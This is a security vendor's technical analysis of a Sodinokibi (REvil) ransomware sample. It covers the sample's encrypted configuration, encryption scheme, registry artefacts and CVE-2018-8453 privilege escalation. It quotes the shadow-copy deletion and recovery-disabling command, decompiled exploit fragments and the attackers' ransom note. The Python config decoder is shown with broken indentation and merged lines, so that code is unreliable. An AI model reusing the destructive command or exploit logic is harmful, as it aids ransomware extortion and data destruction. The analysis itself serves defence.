@@ -1,0 +1,1303 @@
+Sodinokibi is a new ransomware that has infected thousands of clients through managed security service providers (MSSPs). It also exploited vulnerabilities in remote services such as Oracle WebLogic (CVE-2019-2725) and employed mass spam campaigns to proliferate during the Spring of 2019.
+
+BlackBerry® Cylance®'s Professional Services team recently observed an attack where the attackers leveraged Go2Assist via an MSSP to break into a customer's environment and deployed Passcape’s password recovery tool to steal credentials, before establishing a remote desktop connection via RDP into a domain controller, as well as connecting to the victim's Symantec server and disabling it.
+
+This paper contains fresh analysis of a related Sodinokibi sample uncovered by the BlackBerry Cylance threat research team.
+
+Technical Analysis
+
+File
+
+MD5 e6566f78abf3075ebea6fd037803e176 SHA256 861bc212241bcac9f8095c8de1b180b398057cbb2d37c9220086ffaf24ba9e08 Size 160 KB (164,864 bytes) File type PE32 executable for MS Windows (GUI) Intel 80386 32-bit Alias Sodinokibi, Sodin, REvil Compile time 2019-06-10 15:29:32
+
+
+
+Features
+
+File encryption using curve25519/Salsa20
+
+Key encryption using curve25519/AES-256-CTR
+
+Use of two public keys to encrypt the victim’s private key (possibly meaning that there are two entities that can decrypt the files independently)
+
+Use of pseudo-random generation algorithm based on AES for encryption keys, IVs and URLs
+
+C2 obfuscation via large domain list (1079 domains)
+
+Asymmetric key scheduling algorithm prevents need for C2
+
+Disables recovery and deletes volume shadow copies
+
+Exploits CVE-2018-8453 to perform privilege escalation
+
+Uses "Heaven's Gate" method to execute 64-bit exploit code under a 32-bit process (on 64-bit operating systems)
+
+Avoids executing on certain systems depending on the language code (largely related to former USSR countries)
+
+Behavior Overview
+
+Upon execution, Sodinokibi will create a mutex with a hardcoded name Global\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0 and decrypt an embedded configuration.
+
+If the exp parameter in the configuration is set, the malware will attempt to exploit CVE-2018-8453 in order to gain SYSTEM privileges (see the “Privilege escalation” section for more details). If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.
+
+Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters. If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:
+
+Code Language 0x818 Romanian 0x419 Russian 0x819 Russian (Moldova) 0x422 Ukrainian 0x423 Belarusian 0x425 Estonian* 0x426 Latvian* 0x427 Lithuanian* 0x428 Tajik 0x429 Persian* 0x42B Armenian 0x42C Azeri 0x437 Georgian 0x43F Kazakh 0x440 Kygyz 0x442 Turkmen 0x443 Uzbek 0x444 Tatar 0x45A Syrian 0x2801 Arabic (Syria)
+
+Figure 1: Excluded languages
+
+
+
+* The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.
+
+If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.
+
+
+
+cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures
+
+
+
+Figure 2: Command-line to delete volume shadow copies and disable recovery
+
+The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config’s exception list. Unless the executable was run with -nolan command line parameter, the malware will also attempt to encrypt files on network shares. The file encryption routine is discussed in detail in the “File encryption” section.
+
+Each encrypted file will be renamed by adding a previously generated pseudo-random extension, which is stored in the rnd_ext value in the registry. A README file will be dropped in each directory and the background wallpaper will be set with a ransom message:
+
+
+
+Figure 3: Desktop wallpaper and README file on an infected machine
+
+The contents of the README file, as well as the ransom message, are again specified in the config. The key requested by the attackers is a combination of the victim’s system information and generated encryption metadata (needed to derive the decryption keys for the files), AES encrypted and base64 encoded (see “File encryption” section for more details).
+
+Other parameters from the configuration that affect the malware’s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).
+
+String Encryption and Configuration
+
+All strings are encrypted with RC4 using a random key of variable length and are decrypted on-the-fly before use. The key differs for each string and is stored prior the encrypted string in the binary:
+
+.text:00401B1D lea eax, [ebp+var_4]
+
+.text:00401B20 push eax ; out buffer
+
+.text:00401B21 push 3 ; string len
+
+.text:00401B23 push 0Eh ; RC4 key len
+
+.text:00401B25 push 923h ; RC4 key offset
+
+.text:00401B2A push offset encstr_1 ; encrypted string table
+
+.text:00401B2F call decrypt_string ; "exp"
+
+Figure 4: String decryption
+
+The configuration is also RC4 encrypted and is stored together with a 32-byte decryption key, configuration checksum and length value in a randomly named section prior to the .reloc section in the binary:
+
+.s7bz:0041E000 ; Section 4. (virtual address 0001E000)
+
+.s7bz:0041E000 ; Virtual size : 0000C800 ( 51200.)
+
+.s7bz:0041E000 ; Section size in file : 0000C800 ( 51200.)
+
+.s7bz:0041E000 ; Offset to raw data for section: 0001B600
+
+.s7bz:0041E000 ; Flags C0000040: Data Readable Writable
+
+.s7bz:0041E000 ; Alignment : default
+
+.s7bz:0041E000 ;
+
+===========================================================================
+
+.s7bz:0041E000
+
+.s7bz:0041E000 ; Segment type: Pure data
+
+.s7bz:0041E000 ; Segment permissions: Read/Write
+
+.s7bz:0041E000 _s7bz segment para public 'DATA' use32
+
+.s7bz:0041E000 assume cs:_s7bz
+
+.s7bz:0041E000 ;org 41E000h
+
+.s7bz:0041E000 cfg_rc4key db 68h, 38h, 35h, 72h, 68h, 54h, 56h, 58h, 61h, 76h, 4Dh, 45h
+
+.s7bz:0041E000 ; DATA XREF: decrypt_config+40↑o
+
+.s7bz:0041E000 db 6Ah, 58h, 4Ah, 78h, 75h, 58h, 4Dh, 35h, 50h, 70h, 4Dh, 71h
+
+.s7bz:0041E000 db 42h, 4Ah, 38h, 76h, 38h, 4Dh, 4Dh, 51h
+
+.s7bz:0041E020 cfg_hash dd 0AE445D33h ; DATA XREF: decrypt_config+17↑r
+
+.s7bz:0041E024 cfg_len dd 25742 ; DATA XREF: decrypt_config+1↑r
+
+.s7bz:0041E024 ; decrypt_config+24↑r ...
+
+.s7bz:0041E028 enc_cfg db 0B5h, 14h, 0C7h, 67h, 5Dh, 0C9h, 0EDh, 29h, 0CAh, 73h, 7Bh, 7
+
+.s7bz:0041E028 ; DATA XREF: decrypt_config+7↑o
+
+.s7bz:0041E028 db 22h, 0AAh, 0E4h, 12h, 73h, 3Bh, 8Dh, 0A6h, 0C2h, 6Fh, 16h, 2Ch
+
+Figure 5: Encrypted configuration and RC4 key in randomly named section
+
+Once decrypted, the configuration is described using JavaScript Object Notation (JSON):
+
+{
+
+"dbg": false,
+
+"dmn": "",
+
+"exp": true,
+
+"fast": true,
+
+"img": "",
+
+"nbody": "",
+
+"net": true,
+
+"nname": "{EXT}-readme.txt",
+
+"pid": "33",
+
+"pk": "/SvNLPYVd04yhjQWFntNHZ0bsHYz2DzRIF+HjkQuTmE=",
+
+"prc": [
+
+"sqlagent.exe",
+
+"sqbcoreservice.exe",
+
+"mysqld_opt.exe",
+
+"synctime.exe",
+
+"excel.exe",
+
+"thebat64.exe",
+
+"onenote.exe",
+
+"tbirdconfig.exe",
+
+"powerpnt.exe",
+
+"xfssvccon.exe",
+
+"oracle.exe",
+
+"infopath.exe",
+
+"mydesktopqos.exe",
+
+"dbsnmp.exe",
+
+"sqlbrowser.exe",
+
+"mysqld.exe",
+
+"sqlservr.exe",
+
+"wordpad.exe",
+
+"thebat.exe",
+
+"agntsvc.exe",
+
+"thunderbird.exe",
+
+"encsvc.exe",
+
+"ocomm.exe",
+
+"winword.exe",
+
+"msaccess.exe",
+
+"dbeng50.exe",
+
+"firefoxconfig.exe",
+
+"isqlplussvc.exe",
+
+"ocssd.exe",
+
+"visio.exe",
+
+"mydesktopservice.exe",
+
+"sqlwriter.exe",
+
+"ocautoupds.exe",
+
+"mysqld_nt.exe",
+
+"msftesql.exe",
+
+"mspub.exe",
+
+"outlook.exe",
+
+"steam.exe"
+
+],
+
+"sub": "331",
+
+"wfld": [
+
+"backup"
+
+],
+
+"wht": {
+
+"ext": [
+
+"shs",
+
+"bin",
+
+"msp",
+
+"hta",
+
+"mod",
+
+"wpx",
+
+"msi",
+
+"sys",
+
+"ics",
+
+"cmd",
+
+"rtp",
+
+"nomedia",
+
+"scr",
+
+"cur",
+
+"prf",
+
+"msu",
+
+"nls",
+
+"icl",
+
+"ps1",
+
+"bat",
+
+"lnk",
+
+"theme",
+
+"adv",
+
+"deskthemepack",
+
+"diagcab",
+
+"msc",
+
+"lock",
+
+"key",
+
+"ocx",
+
+"hlp",
+
+"msstyles",
+
+"mpa",
+
+"diagcfg",
+
+"icns",
+
+"rom",
+
+"dll",
+
+"com",
+
+"idx",
+
+"cab",
+
+"exe",
+
+"spl",
+
+"drv",
+
+"themepack",
+
+"diagpkg",
+
+"ani",
+
+"386",
+
+"ico",
+
+"ldf",
+
+"cpl"
+
+],
+
+"fld": [
+
+"boot",
+
+"msocache",
+
+"programdata",
+
+"$windows.~ws",
+
+"tor browser",
+
+"program files (x86)",
+
+"$recycle.bin",
+
+"google",
+
+"$windows.~bt",
+
+"intel",
+
+"windows",
+
+"windows.old",
+
+"mozilla",
+
+"system volume information",
+
+"perflogs",
+
+"application data",
+
+"appdata",
+
+"program files"
+
+],
+
+"fls": [
+
+"desktop.ini",
+
+"autorun.inf",
+
+"ntldr",
+
+"bootsect.bak",
+
+"ntuser.dat",
+
+"boot.ini",
+
+"thumbs.db",
+
+"bootfont.bin",
+
+"ntuser.dat.log",
+
+"iconcache.db",
+
+"ntuser.ini"
+
+]
+
+},
+
+"wipe": true
+
+}
+
+Figure 6: JSON configuration file
+
+
+
+All of your files are encrypted! Find {EXT}-readme.txt and follow instructions
+
+Figure 7: Base64 decoded img value from the configuration
+
+---=== Welcome. Again. ===--- [+] Whats Happen? [+] Your files are encrypted, and currently unavailable. You can check it: all files on you computer has expansion {EXT}.
+
+By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER). [+] What guarantees? [+] Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will not cooperate with us. Its not in our interests.
+
+To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.
+
+If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the private key. In practise - time is much more valuable than money. [+] How to get access on website? [+] You have two ways:
+
+1) [Recommended] Using a TOR browser!
+
+a) Download and install TOR browser from this site: https://torproject.org/
+
+b) Open our website: hxxxp:// aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd [dot] onion/{UID} 2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:
+
+a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)
+
+b) Open our secondary website: hxxxp:// decryptor [dot] top/{UID} Warning: secondary website can be blocked, thats why first variant much better and more available. When you open our website, put the following data in the input form:
+
+Key: {KEY}
+
+Extension name: {EXT} ----------------------------------------------------------------------------------------- !!! DANGER !!!
+
+DONT try to change files by yourself, DONT use any third party software for restoring your data or antivirus solutions - its may entail damge of the private key and, as result, The Loss all data.
+
+!!! !!! !!! ONE MORE TIME: Its in your interests to get your files back. From our side, we (the best specialists) make everything for restoring, but please should not interfere.
+
+!!! !!! !!!
+
+Figure 8: Base64 decoded nbody value from the configuration
+
+Key Type Description prc Array of strings Process names to terminate dmn String Semi-colon separated list of domain names img String (Base64 encoded) Message to display on desktop wallpaper pid String (Integer) Actor ID sub String (Integer) Campaign ID fast Boolean Enable fast mode (encrypt only the first 1 MB of each file) wfld Array of strings Folders to wipe wht Object Whitelist wht.fld Array of strings Folders to whitelist from encryption wht.fls Array of strings Files to whitelist from encryption wht.ext Array of strings File extensions to whitelist from encryption dbg Boolean Debug mode. If set, don't check for keyboard layout exp Boolean Enable privilege escalation “exploit” (CVE-2018-8453) pk String (Base64 encoded) Attacker’s public encryption key (256-bit) net Boolean Send HTTP POST request to domains wipe Boolean If true, then wipe files in specified folders nname String (Base64 encoded) Readme filename nbody String (Base64 encoded) Readme file contents
+
+Figure 9: Configuration field details
+
+We wrote a configuration decoder that should work with the currently known versions of Sodinokibi. The script requires Python scandir and pefile modules:
+
+"""Extract Sodinokibi ransomware configuration from a given exe/folder of exes"""
+
+import os
+
+import sys
+
+import scandir
+
+
+
+import pefile
+
+import string
+
+import struct
+
+import json
+
+
+
+def rc4(key, enc_data):
+
+dec = ""
+
+enc = []
+
+enclen = len(enc_data) keylen = len(key)
+
+rc4key = [ord(c) for c in key]
+
+for i in range(enclen):
+
+enc.append(ord(enc_data[i])) s = range(256)
+
+j = 0
+
+for i in range(256):
+
+j = (j + s[i] + rc4key[i % keylen]) % 256
+
+s[i], s[j] = s[j], s[i]
+
+
+
+i = 0
+
+j = 0
+
+keystream = []
+
+for i in range(enclen):
+
+i = (i + 1) % 256
+
+j = (j + s[i]) % 256
+
+s[i], s[j] = s[j], s[i]
+
+k = s[(s[i] + s[j]) % 256]
+
+keystream.append(k)
+
+
+
+for e, k in zip(enc, keystream):
+
+dec += chr(e ^ k) return dec def extract_sodinokibi_config(filename):
+
+print(filename)
+
+try:
+
+pe = pefile.PE(filename) section = pe.sections[3]
+
+data = section.get_data()
+
+enc_len = struct.unpack('I', data[0x24:0x28])[0]
+
+dec_data = rc4(data[0:32], data[0x28:enc_len + 0x28]) print(json.dumps(json.loads(filter(lambda x: x in string.printable, dec_data)), indent=2, sort_keys=True))
+
+except Exception as e:
+
+print("ERROR - {}".format(e)) def main():
+
+if os.path.isdir(sys.argv[1]):
+
+for root, dirs, files in scandir.walk(sys.argv[1]):
+
+for file in files:
+
+extract_sodinokibi_config(os.path.join(root, file))
+
+else:
+
+extract_sodinokibi_config(sys.argv[1]) if __name__ == "__main__":
+
+try:
+
+main()
+
+except KeyboardInterrupt:
+
+pass
+
+Figure 10: Python script for decoding configuration
+
+Privilege Escalation
+
+If the exp (exploit) value in the config is set to "true", and the file timestamps of win32k.sys and win32kfull.sys are below 2018/09/11-00:00:00, the malware will attempt to exploit a vulnerability in win32k.sys (CVE-2018-8453) in order to perform privilege escalation to elevate to SYSTEM, before running the ransomware routine. Both 32-bit and 64-bit versions of the exploit code are stored inside the .rdata section of the binary and depending on the system architecture one of these code portions will be copied to a readable/writable/executable (RWX) memory region and executed.
+
+Then things get very interesting. Despite being a 32-bit application, Sodinokibi contains both 32 and 64-bit exploit code. When Sodinokibi detects that it is running as a 32-bit process on a 64-bit system, it will utilize a seldom seen technique called "Heaven's Gate" to transition to 64-bit mode, and repeatedly switch in and out of 32/64-bit mode whilst running portions of the exploit code. The actual transition is also interesting, in that it calls into the middle of an opcode (push 0x00cb0033) to trigger the switch from 32 to 64-bit mode.
+
+In the code below, the x86_to_x64 function will preserve the code-selector (CS) register on the stack (which will be 0x23 for x86 mode). After calling into the Heaven's_Gate function, the value 0x00CB0033 is pushed to the stack, and the next call instruction will call into the middle of the push opcode, starting at the 0xCB byte, which corresponds to a retf opcode.
+
+The retf differs from a regular ret opcode in that it will not only pop the return address off the stack, but also a new CS value, in this case 0x33. With the new CS value in place, the segment-selector will now point to a different GDT entry that has a bit set to specify that it is an x64 code descriptor, and execution will then resume after the final call instruction in 64-bit mode. Returning from 64-bit mode back to 32-bit is a simple reverse operation using a retf with the 32-bit CS (0x23) and EIP on the stack:
+
+debug032:00075DF0 x86_to_x64 proc near
+
+debug032:00075DF0 push ebp
+
+debug032:00075DF1 mov ebp, esp
+
+debug032:00075DF3 push ebx
+
+debug032:00075DF4 push esi
+
+debug032:00075DF5 push edi
+
+debug032:00075DF6 push cs ; Preserve x86 CS
+
+debug032:00075DF7 call heavens_gate
+
+debug032:00075DFC pop edi
+
+debug032:00075DFD pop esi
+
+debug032:00075DFE pop ebx
+
+debug032:00075DFF leave
+
+debug032:00075E00 retn
+
+debug032:00075E00 x86_to_x64 endp
+
+debug032:00075E00
+
+debug032:00075E01 heavens_gate:
+
+debug032:00075E01 push 0CB0033h ; 0xCB = retf, 0x33 = new CS (x64)
+
+debug032:00075E06 call near ptr heavens_gate+3debug032:00075E0B inc ecx ; Execution resumes in x64 mode
+
+Figure 11: Heaven's Gate
+
+Regardless of the x86/64 code path taken, and the fact that the x64 code requires considerably more loading (as it has to walk the imports for Sodinokibi and load all libraries and resolve all imports), both the x86/64 exploit code ultimately operate in a relatively similar manner, broadly in line with previous research from Kaspersky, although containing subtle differences to heap feng shui routines and certain class names.
+
+The exploit ultimately operates by hooking functions in the KernelCallbackTable (fnDWORD, fnNCDESTROY, and fnINLPCREATESTRUCT):
+
+
+
+Figure 12: Hooks in KernelCallbackTable
+
+The exploit code first creates a window named "sysshadow", as well as a scrollbar:
+
+
+
+int __stdcall CreateScrollBarWindowProc(HWND hWndParent, UINT uMsg, WPARAM wParam, LPARAM lParam)
+
+{
+
+LPVOID v1; // esi
+
+DWORD dwClassLong; // eax
+
+
+
+v1 = TlsGetValue(dwTlsIndex);
+
+if ( v1 )
+
+{
+
+if ( uMsg == 1 )
+
+{
+
+*((_DWORD *)v1 + 64) = CreateWindowExA(0, ”SCROLLBAR”, 0, 0x50000001u, 0, 0, 0, 0, hWndParent, 0, hInstance, 0);
+
+dwClassLong = GetClassLongA(hWndParent, GCL_STYLE);
+
+SetClassLongA(hWndParent, GCL_STYLE, dwClassLong | 0x20000);
+
+}
+
+else
+
+{
+
+if ( uMsg != 2 )
+
+return NtdllDefWindowProc_A(hWndParent, uMsg, wParam, lParam);
+
+PostQuitMessage(0);
+
+}
+
+}
+
+return 0;
+
+}
+
+Figure 13: Scrollbar creation
+
+After which it sets the window position under the fnINLPCREATESTRUCT hook:
+
+int __stdcall fnINLPCREATESTRUCT_hook_x86(int a1)
+
+{
+
+_DWORD *v1; // esi
+
+int v2; // ebx
+
+BOOL v3; // eax
+
+CHAR ClassName; // [esp+8h] [ebp-104h] v1 = TlsGetValue(dwTlsIndex);
+
+if ( v1 )
+
+{
+
+if ( a1 )
+
+{
+
+if ( GetCurrentThreadId() == v1[53] )
+
+{
+
+v2 = **(_DWORD **)(a1 + 24);
+
+if ( GetClassNameA(**(HWND **)(a1 + 24), &ClassName, 260) )
+
+{
+
+if ( !v1[65] )
+
+{
+
+if ( strcmpi(&ClassName, ”sysshadow”) )
+
+{
+
+if ( strcmpi(&ClassName, ” msctfime ui”) )
+
+return fnINLPCREATESTRUCT(a1);
+
+v3 = 1;
+
+}
+
+else
+
+{
+
+v1[65] = v2;
+
+v3 = v1[79] == 0;
+
+}
+
+if ( v3 )
+
+set_window_pos(v1);
+
+}
+
+}
+
+}
+
+}
+
+}
+
+return fnINLPCREATESTRUCT (a1);
+
+}
+
+Figure 14: fnINLPCREATESTRUCT hook
+
+The fnDWORD hook is trigged by issuing a left mouse click to the scrollbar:
+
+
+
+PostMessageA(*((HWND *)lpThreadParameter + 64), WM_LBUTTONDOWN, 1u, 1);
+
+
+
+
+
+From within the fnDWORD hook, the scrollbar is ultimately freed…
+
+DWORD __stdcall fnDWORD_hook_x86(int a1)
+
+{
+
+int v1; // ebx
+
+DWORD result; // eax
+
+_DWORD *v3; // esi
+
+HWND v4; // [esp-8h] [ebp-Ch]
+
+
+
+v1 = *(unsigned __int16 *)(a1 + 4);
+
+if ( (_WORD)v1 == 647 )
+
+{
+
+a1 = 0;
+
+return NtCallbackReturn(&a1, 12, 0);
+
+}
+
+v3 = TlsGetValue(dwTlsIndex);
+
+if ( !v3 )
+
+goto LABEL_14;
+
+result = GetCurrentThreadId();
+
+if ( result != v3[53] || !*((_BYTE *)v3 + 332) || v3[51] )
+
+goto LABEL_14;
+
+if ( !v3[80] || v1 != 31 )
+
+{
+
+if ( version_sth_0 < 16 && v1 == 6 )
+
+set_window_pos(v3);
+
+if ( v1 == 112 )
+
+{
+
+v4 = (HWND)v3[62];
+
+*((_BYTE *)v3 + 332) = 2;
+
+SetActiveWindow(v4);
+
+SendMessageA((HWND)v3[62], WM_SYSCOMMAND, SC_KEYMENU, 0);
+
+DestroyWindow((HWND)v3[64]);
+
+*((_BYTE *)v3 + 332) = 4;
+
+}
+
+LABEL_14:
+
+result = fnDWORD(a1);
+
+}
+
+return result;
+
+}
+
+Figure 15: fnDWORD hook
+
+… leading to the fnNCDESTROY hook gaining execution, where calling NtUserSetWindowFNID erroneously allows the free'd scrollbar to be marked as a button (instead of free). This causes the "sysshadow" window to retain a reference to the free'd memory:
+
+_WORD *__stdcall fnNCDESTROY_hook_x86(_DWORD **a1)
+
+{
+
+<snip>
+
+
+
+SendMessageA(v20, WM_CANCELMODE, 0, 0);
+
+v17 = (HWND *)(v4 + 681);
+
+do
+
+{
+
+SetClassLongW(*v17, GCL_MENUNAME, 0);
+
+v17 += 5;
+
+--v11;
+
+}
+
+while ( v11 );
+
+v18 = (HWND *)(v4 + 6825);
+
+v19 = 128;
+
+do
+
+{
+
+*(_DWORD *)(v4 + 8) = v23++;
+
+SetClassLongW(*v18, GCL_MENUNAME, v4);
+
+v18 += 4;
+
+--v19;
+
+}
+
+while ( v19 );
+
+result = v22;
+
+v1 = 1;
+
+v8 = v21;
+
+}
+
+if ( v8 == *(_DWORD *)(v4 + 260) && *result == (unsigned __int16)FNID_FREED && !*(_DWORD *)(v4 + 324) )
+
+{
+
+result = (_WORD *)NtUserSetWindowFNID(*(_DWORD *)(v4 + 244), FNID_BUTTON);
+
+*(_DWORD *)(v4 + 324) = result;
+
+v1 = 1;
+
+}
+
+if ( !v1 )
+
+{
+
+v3 = a1;
+
+LABEL_26:
+
+result = (_WORD *)fnNCDESTROY(v3);
+
+}
+
+return result;
+
+}
+
+Figure 16: fnNCDESTROY hook
+
+Heap feng shui is then triggered from a windows event hook when the EVENT_OBJECT_DESTROY event occurs on the scrollbar, in order to reclaim the freed memory:
+
+int __fastcall ntuser_thunked_menu_item_info(_DWORD *a1, int a2, int a3)
+
+{
+
+int result; // eax
+
+int *v4; // edi
+
+int v5; // ebx
+
+int v6; // [esp-18h] [ebp-5Ch]
+
+MENUITEMINFOW sMenuItemInfo; // [esp+Ch] [ebp-38h]
+
+int v8; // [esp+3Ch] [ebp-8h] result = 0;
+
+v8 = a2;
+
+v4 = a1;
+
+if ( a3 )
+
+{
+
+if ( windows_10_version == 10 )
+
+v5 = ' ';
+
+else
+
+v5 = aDp8lDp8lDp8l_0[7 * windows_10_version + 6];
+
+j_memset(&sMenuItemInfo, 0, 48);
+
+sMenuItemInfo.cbSize = sizeof(MENUITEMINFOW);
+
+sMenuItemInfo.fMask = MIIM_ID;
+
+sMenuItemInfo.wID = a3 - v5;
+
+result = NtUserThunkedMenuItemInfo(v4[59], v4[73] + 9, 1, 0, (int)&sMenuItemInfo, 0);
+
+if ( result )
+
+{
+
+sMenuItemInfo.dwItemData = v8;
+
+v6 = v4[60];
+
+sMenuItemInfo.fMask = MIIM_DATA;
+
+result = NtUserThunkedMenuItemInfo(v6, 0, 1, 0, (int)&sMenuItemInfo, 0);
+
+}
+
+}
+
+return result;
+
+}
+
+Figure 17: Portion of heap feng shui code
+
+With the freed memory reclaimed, the exploit then establishes and operates arbitrary kernel memory read/write primitives, which are used to locate the System process token from the EPROCESS structure and copy it to its own EPROCESS structure, resulting in SYSTEM privileges for the ransomware:
+
+
+
+Figure 18: Ransomware now running as SYSTEM
+
+Given the complexities of the exploit, heap feng shui, and trigger mechanisms, BlackBerry Cylance researchers aim to explore this further as part of a separate blog article.
+
+
+
+File Encryption
+
+In terms of encryption, Sodinokibi uses a symmetric algorithm (Salsa20 for files, AES-256-CTR for registry values and C2 beacons) in conjunction with an asymmetric key exchange method based on the curve25519 implementation.
+
+In the first step, a main curve25519 key pair is generated for the victim. The public key from this pair will later be used to derive the Salsa20 keys for file encryption. The secret/private key (needed for file decryption) is initiated using a fairly sophisticated AES-based PRNG algorithm with a hardcoded seed, and then encrypted with AES-256 in CTR mode and saved to the registry. The AES key used in that process is a SHA3-256 sum of the shared secret derived from the private key of a secondary curve25519 generated key pair and the attacker’s public key stored in the pk section of the configuration.
+
+In fact, the malware stores two versions of the victim’s private key, one which is encrypted with a key derived by using the public key delivered through the config’s pk value, and one which is encrypted using a key derived with the use of a hardcoded public key stored in the binary’s .data section. Both of these values are later appended to each encrypted file, which suggests that the hardcoded public key might have been embedded by the malware developers as a "master key" in order to give them the ability of decrypting files encrypted by affiliates:
+
+.text:00402416 generate_keys: ; CODE XREF: generate_keys_set_reg_values+1A8↑j
+
+.text:00402416 ; generate_keys_set_reg_values+1AE↑j ...
+
+.text:00402416 lea eax, [ebp+victim_main_privkey]
+
+.text:0040241C push offset victim_main_pubkey
+
+.text:00402421 push eax
+
+.text:00402422 call generate_curve25519_keypair ; generate victim's main key pair
+
+.text:00402427 push 20h
+
+.text:00402429 pop edi
+
+.text:0040242A lea eax, [ebp+encprivkey_metadata_1_len]
+
+.text:0040242D mov [ebp+victim_pubkey_len], edi
+
+.text:00402430 push eax ; out_len
+
+.text:00402431 push edi ; data_len
+
+.text:00402432 lea eax, [ebp+victim_main_privkey]
+
+.text:00402438 mov [ebp+attacker_pubkey_len], edi
+
+.text:0040243B push eax ; datain
+
+.text:0040243C push offset affiliate_pubkey
+
+.text:00402441 call curve25519_aes_encrypt ;
+
+.text:00402441 ; generate victim's secondary key pair and derive
+
+.text:00402441 ; key for AES-256-CTR encryption using curve25519
+
+.text:00402441 ; with priv key from this pair & pub key from cfg
+
+.text:00402446 mov ebx, eax
+
+.text:00402448 lea eax, [ebp+encprivkey_metadata_2_len]
+
+.text:0040244B push eax ; out_len
+
+.text:0040244C push edi ; data_len
+
+.text:0040244D lea eax, [ebp+victim_main_privkey]
+
+.text:00402453 push eax ; datain
+
+.text:00402454 push offset master_pubkey
+
+.text:00402459 call curve25519_aes_encrypt ;
+
+.text:00402459 ; generate victim's tertiary key pair and derive
+
+.text:00402459 ; key for AES-256-CTR encryption using curve25519
+
+.text:00402459 ; with priv key from this pair & pub key from .data
+
+.text:0040245E mov esi, eax
+
+.text:00402460 lea eax, [ebp+victim_main_privkey]
+
+.text:00402466 push edi
+
+.text:00402467 push eax.text:00402468 call memset_zero ; remove victim's main private key from memory
+
+Figure 19: Victim's key generation
+
+Sodinokibi uses an AES-based PRNG algorithm to generate a random extension that will be added to the encrypted files. It also generates a unique victim ID by combining the hash of the value returned by CPUID instruction with the volume serial number.
+
+It then gathers system information (such as username, computer name, TCP/IP domain, OS version and language, CPU architecture, and disk free space) and encrypts it using the same algorithm as for the private key encryption (except in this case yet another hardcoded public key from the .data section is used for AES key derivation).
+
+The following information is saved under either HKLM\SOFTWARE\recfg or HKCU\SOFTWARE\recfg key:
+
+Value Name Type Content 0_key REG_BIN Master key metadata (includes victim’s main private key, encrypted using the AES key derived from the hardcoded key stored in the binary’s .data section) sk_key REG_BIN Affiliate key metadata (includes the victim’s main private key, encrypted using the AES key derived from the hardcoded key from the config) pk_key REG_BIN Victim’s main public key sub_key REG_BIN Attacker's public key from config stat REG_BIN Victim’s machine information and encryption metadata (encrypted with AES), used as the victim’s key in README file, and for the POST requests rnd_ext REG_SZ Random extension for encrypted files ("." + 5-10 alphanumeric characters)
+
+Figure 20: Registry values set by Sodinokibi
+
+Figure 21: Example registry setup
+
+To speed up the encryption process, Sodinokibi makes use of IO completion ports – a Windows threading model for processing multiple asynchronous I/O requests on a multiprocessor system:
+
+.text:00402C76
+
+.text:00402C76 ; =============== S U B R O U T I N E =======================================
+
+.text:00402C76
+
+.text:00402C76 ; Attributes: bp-based frame
+
+.text:00402C76
+
+.text:00402C76 read_encrypt_write_file_thread proc near
+
+.text:00402C76 ; DATA XREF: encrypt_all_files+C↑o
+
+.text:00402C76
+
+.text:00402C76 CompletionKey = dword ptr -0Ch
+
+.text:00402C76 NumberOfBytesTransferred= dword ptr -8
+
+.text:00402C76 Overlapped_then_cryptostruct= dword ptr -4
+
+.text:00402C76 CompletionPort = dword ptr 8
+
+.text:00402C76
+
+.text:00402C76 push ebp
+
+.text:00402C77 mov ebp, esp
+
+.text:00402C79 sub esp, 0Ch
+
+.text:00402C7C push esi
+
+.text:00402C7D call find_explorer_ImpersonateLoggedOnUser
+
+.text:00402C82 mov esi, [ebp+CompletionPort]
+
+.text:00402C85 jmp short GetQueuedCompletionStatus_loop
+
+.text:00402C87 ; ---------------------------------------------------------------------------
+
+.text:00402C87
+
+.text:00402C87 encrypt_files: ; CODE XREF: read_encrypt_write_file_thread+AE↓j
+
+.text:00402C87 test eax, eax
+
+.text:00402C89 jz short PostQueuedCompletionStatus
+
+.text:00402C8B push 0
+
+.text:00402C8D push [ebp+NumberOfBytesTransferred]
+
+.text:00402C90 push [ebp+Overlapped_then_cryptostruct]
+
+.text:00402C93 call adjust_file_offsets
+
+.text:00402C98 mov ecx, [ebp+Overlapped_then_cryptostruct]
+
+.text:00402C9B add esp, 0Ch
+
+.text:00402C9E mov eax, [ecx+cryptostruct.io_completion_disposition]
+
+.text:00402CA4 sub eax, 0
+
+.text:00402CA7 jz short _0_read_file
+
+.text:00402CA9 sub eax, 1
+
+.text:00402CAC jz short _1_encrypt_file
+
+.text:00402CAE sub eax, 1
+
+.text:00402CB1 jz short _2_write_key_to_file
+
+.text:00402CB3 sub eax, 1
+
+.text:00402CB6 jnz short GetQueuedCompletionStatus_loop
+
+.text:00402CB8
+
+.text:00402CB8 _3_move_file: ; cryptostruct
+
+.text:00402CB8 push ecx
+
+.text:00402CB9 push esi ; CompletionPort
+
+.text:00402CBA call do_move_file_add_extension
+
+.text:00402CBF jmp short next
+
+Figure 22: File encryption thread used in IO completion routine
+
+The algorithm used for file encryption is Salsa20, and a 32-byte Salsa key will be generated for each file using a curve25519-based key derivation algorithm, with the input of the previously generated victim’s public key and a private key from a temporary pair of curve25519 keys generated per file:
+
+Figure 23: Salsa20 key generation using curve22519
+
+The following information is appended at the end of each encrypted file:
+
+
+
